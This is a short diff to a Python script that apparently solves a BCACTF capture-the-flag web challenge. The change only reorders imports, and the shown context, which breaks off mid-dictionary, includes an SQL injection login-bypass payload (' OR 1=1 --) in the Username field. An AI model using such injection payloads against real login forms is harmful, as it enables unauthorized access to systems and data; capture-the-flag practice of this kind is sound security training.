@@ -1,7 +1,8 @@
 #!/usr/bin/python3
 
-import requests
 import re
+
+import requests
 
 url = "http://web.bcactf.com:49160/"
 payload = {	"Username": "' OR 1=1 --",
